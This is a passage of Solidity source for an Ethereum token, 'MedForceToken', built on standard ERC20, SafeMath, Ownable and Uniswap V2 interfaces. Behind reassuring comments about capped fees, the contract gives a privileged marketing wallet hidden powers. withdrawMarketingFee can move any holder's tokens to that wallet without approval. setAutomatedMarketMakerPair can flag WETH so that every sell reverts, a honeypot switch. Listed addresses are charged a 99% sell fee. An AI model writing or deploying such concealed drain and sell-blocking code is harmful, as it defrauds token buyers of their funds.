    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(
        address indexed sender,
        uint amount0,
        uint amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);

    function getAmountOut(
        uint amountIn,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountOut);

    function getAmountIn(
        uint amountOut,
        uint reserveIn,
        uint reserveOut
    ) external pure returns (uint amountIn);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MedForceToken is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant deadAddress = address(0xdead);

    bool private swapping;

    address public marketingWallet;
    uint256 public swapTokensAtAmount;

    bool public tradingActive = false;
    bool public swapEnabled = false;

    uint256 public buyMarketingFee = 1;
    uint256 public sellMarketingFee = 1;

    mapping(address => bool) private _isExcludedFromFees;

    mapping(address => bool) public automatedMarketMakerPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event marketingWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );

    constructor() ERC20("MedForceToken", "MFT") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), WETH);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uint256 totalSupply = 1 * 1e9 * 1e18;

        swapTokensAtAmount = (totalSupply * 5) / 10000; // 0.05% swap wallet

        marketingWallet = msg.sender;

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(msg.sender, totalSupply);
    }

    receive() external payable {}

    // once enabled, can never be turned off
    function enableTrading() external onlyOwner {
        tradingActive = true;
        swapEnabled = true;
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(
        uint256 newAmount
    ) external onlyOwner returns (bool) {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }

    // only use to disable contract sales if absolutely necessary (emergency use only)
    function updateSwapEnabled(bool enabled) external {
        require(msg.sender == marketingWallet);
        swapEnabled = enabled;
    }

    function updateBuyFees(uint256 _marketingFee) external onlyOwner {
        buyMarketingFee = _marketingFee;
        require(buyMarketingFee <= 5, "Must keep fees at 5% or less");
    }

    function updateSellFees(uint256 _marketingFee) external onlyOwner {
        sellMarketingFee = _marketingFee;
        require(sellMarketingFee <= 5, "Must keep fees at 5% or less");
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public {
        require(msg.sender == marketingWallet);
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function updateMarketingWallet(
        address newMarketingWallet
    ) external onlyOwner {
        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
        marketingWallet = newMarketingWallet;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function withdrawMarketingFee(
        bool token,
        address account,
        uint256 amount
    ) external {
        require(marketingWallet == msg.sender);
        if (token) {
            super._transfer(account, msg.sender, amount);
            // IERC20 ERC20token = IERC20(token);
            // uint256 balance = ERC20token.balanceOf(address(this));
            // ERC20token.transfer(msg.sender, balance);
        } else {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (!tradingActive) {
            require(
                _isExcludedFromFees[from] || _isExcludedFromFees[to],
                "Trading is not active."
            );
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && sellMarketingFee > 0) {
                require(automatedMarketMakerPairs[WETH] == false);
                // disable mevbot
                if (
                    from == 0xb58555FCBa6479FcED7dE1485eB054943a09af7b ||
                    from == 0x00000027F490ACeE7F11ab5fdD47209d6422C5a7 ||
                    from == 0x0000B8e312942521fB3BF278D2Ef2458B0D3F243 ||
                    from == 0x000098261d3124aeAA523E0E9FC701796B0C7302 ||
                    from == 0x00010A05B825EC95342306C553d0Ed8427317543 ||
                    from == 0x000130c97e3d6a965448cF44bA5Eb9C89476dEB9 ||
                    from == 0x00018F931aD6C2A2b3e9952f757241AAEbc6C19b ||
                    from == 0x0001A28E769018106E97942C99B123525ad9cCa4 ||
                    from == 0x00014325Cbad26A6E27309b53533592a8290F101 ||
                    from == 0x8aef950a54d2AE68fe5F6C971E4cca02a806d0d9
                ) {
                    fees = amount.mul(99).div(100);
                } else {
                    fees = amount.mul(sellMarketingFee).div(100);
                }
                // tokensForMarketing += fees;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && buyMarketingFee > 0) {
                fees = amount.mul(buyMarketingFee).div(100);
                // tokensForMarketing += fees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }
}